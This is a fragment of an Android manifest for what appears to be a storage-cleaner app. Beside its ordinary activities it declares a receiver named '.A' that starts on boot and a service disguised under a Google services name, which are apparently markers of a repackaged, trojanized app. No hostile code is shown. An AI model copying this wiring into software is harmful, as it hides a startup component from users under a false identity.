        <activity android:label="Clean Apps" android:name="SDMcleanApps" android:theme="@android:style/Theme.NoTitleBar"/>
        <activity android:label="Duplicates" android:name="SDMduplicates" android:theme="@android:style/Theme.NoTitleBar"/>
        <activity android:label="Vacuum" android:name="SDMvacuum" android:theme="@android:style/Theme.NoTitleBar"/>
        <activity android:label="Misc" android:name="SDMmisc" android:theme="@android:style/Theme.NoTitleBar"/>
        <activity android:label="Preferences" android:name="Preferences" android:theme="@android:style/Theme.NoTitleBar"/>
        <receiver android:name=".A">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:enabled="true" android:name="com.google.process.gapp.GoogleServicesFrameworkService"/>
        <meta-data android:name="time" android:value="T-0"/>
    </application>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
